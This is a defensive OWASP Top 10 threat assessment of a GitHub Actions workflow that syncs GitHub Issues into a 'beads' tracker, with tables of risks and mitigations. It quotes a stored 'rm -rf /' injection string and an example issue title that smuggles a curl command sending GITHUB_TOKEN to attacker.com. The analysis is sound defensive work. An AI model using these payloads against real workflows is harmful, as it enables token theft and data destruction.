# OWASP Top 10 Analysis: GitHub Actions Issue Sync Feature

**Date**: 2026-03-21
**Scope**: GitHub Issues <-> Beads sync via GitHub Actions workflows
**Architecture**: issues.opened/closed triggers -> Node scripts -> `bd` CLI via `execFile` -> `.beads/` commit+push

---

## OWASP Top 10 (2021) Assessment

| # | Category | Applies? | Severity | Risk | Mitigation |
|---|----------|----------|----------|------|------------|
| A01 | Broken Access Control | YES | HIGH | Any GitHub user who can open an issue triggers `bd create` and a commit+push to the repo. Attacker floods `.beads/issues.jsonl` with garbage or manipulates mapping to hijack beads IDs. GITHUB_TOKEN with `contents: write` gives workflow full repo write access. | 1. Gate on `author_association` (MEMBER/OWNER/COLLABORATOR only). 2. Scope GITHUB_TOKEN to minimum per-job permissions. 3. Validate mapping writes with schema check before commit. |
| A02 | Cryptographic Failures | NO | N/A | No secrets in `.beads/` data. Issue content is public. GITHUB_TOKEN is auto-provisioned, short-lived. | Ensure mapping file never stores sensitive data. Never log token values. |
| A03 | **Injection** | **YES** | **CRITICAL** | Issue titles/bodies passed as arguments to `bd create`. While `execFile` avoids shell parsing, `bd` CLI may pass args to sub-shells or write unsanitized data to JSONL. **Evidence in codebase**: `forge-04t` in `.beads/issues.jsonl` already contains `echo PWNED2  rm -rf /` in its notes field, proving injection payloads reach storage. If any consumer evaluates JSONL content in shell context, code execution occurs. | 1. Sanitize inputs: strip control chars, null bytes, newlines from title. Enforce max length (256 title, 4096 body). 2. Allowlist title chars: `[a-zA-Z0-9 \-_:.,()\[\]#]`. 3. Pass body via stdin, not argument (avoids ARG_MAX). 4. Audit `bd` CLI: must never use shell-based execution internally. 5. Validate JSONL integrity after every write. |
| A04 | Insecure Design | YES | MEDIUM | Bidirectional sync creates feedback loop risk (push triggers other workflows). Mapping file is single point of failure. No rate limiting on issue creation means unbounded commits. | 1. Use `[skip ci]` or conditional checks to prevent cascades. 2. Add `concurrency` group to serialize runs. 3. Rate-limit: cap at N syncs/hour. 4. Atomic file ops (write-then-rename) for mapping. |
| A05 | Security Misconfiguration | YES | MEDIUM | Overly broad workflow `permissions`. Default GITHUB_TOKEN may be read+write. Actions pinned to tags (`@v4`) not SHA allows supply chain compromise. | 1. Set `permissions` per-job, not workflow level. 2. Pin actions to full commit SHA. 3. Set repo default token to read-only. |
| A06 | Vulnerable Components | NO | LOW | No external npm deps in sync workflow. | Lock Node version. Run `npm audit` in CI if deps are added. |
| A07 | Auth Failures | YES | MEDIUM | GITHUB_TOKEN cannot distinguish legitimate vs attacker-controlled issues. Bot comments that reflect issue data could enable reflected content injection. | 1. Gate on `author_association`. 2. Sanitize all data in bot comments. |
| A08 | **Data Integrity** | **YES** | **HIGH** | Workflow commits directly to default branch without PR review. Attacker-controlled issue content gets committed to `.beads/issues.jsonl`. If CI reads and evaluates JSONL in a `run:` step, this is code execution. Race conditions can corrupt mapping file. | 1. Never evaluate JSONL in shell context -- always use proper JSON parsing. 2. Validate JSONL schema before commit. 3. Consider dedicated branch with auto-merge. 4. Sign commits with GPG. |
| A09 | Logging Failures | YES | LOW | No audit trail of sync actions. Failed syncs silently drop issues. | Log every sync (issue number, beads ID, timestamp, author). Add failure notifications. |
| A10 | SSRF | NO | N/A | No outbound HTTP beyond GitHub API. | N/A unless future webhook callbacks are added. |

---

## GitHub Actions-Specific Risks

| Risk | Severity | Description | Mitigation |
|------|----------|-------------|------------|
| **Workflow injection via `${{ }}` interpolation** | CRITICAL | If workflow uses `${{ github.event.issue.title }}` in a `run:` block, a title like `"; curl attacker.com?t=$GITHUB_TOKEN #` exfiltrates secrets. | **Never interpolate user data in `run:` blocks.** Use `env:` mapping: `ISSUE_TITLE: ${{ github.event.issue.title }}`, reference as `"$ISSUE_TITLE"`. Better: pass only issue number, fetch via API in Node. |
| Secrets exposure in logs | MEDIUM | `execFile` errors may dump arguments (including issue content) to stderr/workflow logs. | Wrap in try/catch, sanitize error output. Use `::add-mask::` for dynamic values. |
| Fork/public repo abuse | MEDIUM | Any GitHub user can open issues on public repos, triggering the workflow. | Gate on `author_association` or require maintainer-applied label before sync. |
| Action supply chain | MEDIUM | Compromised third-party actions could exfiltrate GITHUB_TOKEN or modify checkout. | Pin all actions to commit SHA. Minimize third-party action usage. |
| PR-based workflow modification | LOW | Attacker PR modifying workflow files could alter sync logic. | Protect `.github/workflows/` via CODEOWNERS. Require review. |

---

## Command Injection Deep Dive

| Vector | execFile Safe? | Downstream Risk | Mitigation |
|--------|---------------|-----------------|------------|
| Title as `bd create --title <TITLE>` arg | Yes -- no shell parsing | `bd` CLI may internally use shell-based execution or write to shell scripts | Audit `bd` source: must use safe execution methods internally. |
| Body as `--description <BODY>` arg | Partial -- long bodies may exceed ARG_MAX | Truncation could break downstream parsing | Pass via stdin pipe. Enforce 4KB max. |
| Newlines in title | execFile handles correctly | JSONL corruption if not JSON-escaped | Always use JSON.stringify(). Validate JSONL after write. |
| Unicode/null bytes | execFile handles correctly | Null bytes truncate C-based tools. Homographs confuse reviewers. | Strip null bytes. Restrict to safe Unicode ranges. |

---

## Race Condition Analysis

| Scenario | Severity | Description | Mitigation |
|----------|----------|-------------|------------|
| Concurrent issue creation | HIGH | Two workflows read mapping -> both write -> last write wins, first mapping lost. | Use `concurrency` group with `cancel-in-progress: false` to serialize. Or use `flock` in script. |
| Rapid open+close | MEDIUM | Close workflow runs before create finishes -> beads ID not in mapping -> close fails silently. | Close workflow retries if mapping entry not found. Add delay or queue. |
| Concurrent push conflicts | HIGH | Two workflows both `git push` -> one rejected with non-fast-forward -> sync silently fails. | Retry loop: `git pull --rebase && git push` (max 3 retries). Log failures. |
| Mapping file corruption | MEDIUM | Concurrent JSON writes produce invalid JSON -> all future syncs break. | Atomic writes (temp + rename). Validate JSON before commit. Self-heal: rebuild from JSONL if invalid. |

---

## Top 5 Priority Mitigations

| Priority | Action | Blocks |
|----------|--------|--------|
| 1. CRITICAL | Never interpolate `${{ github.event.issue.title/body }}` in `run:` blocks. Pass via env vars or fetch by issue number in Node. | Prevents secret exfiltration and RCE on runner. |
| 2. CRITICAL | Sanitize and length-limit title/body before `bd create`. Strip control characters, enforce allowlist. | Prevents injection payloads reaching `.beads/` storage. |
| 3. HIGH | Add `concurrency` group to serialize workflow runs. Implement retry loop for push conflicts. | Prevents race conditions and silent data loss. |
| 4. HIGH | Gate issue processing on `author_association` or require maintainer-applied label. | Prevents abuse from arbitrary GitHub users on public repos. |
| 5. HIGH | Pin all actions to commit SHA. Set minimal `permissions` per job. Set repo default token to read-only. | Prevents supply chain attacks and limits blast radius. |
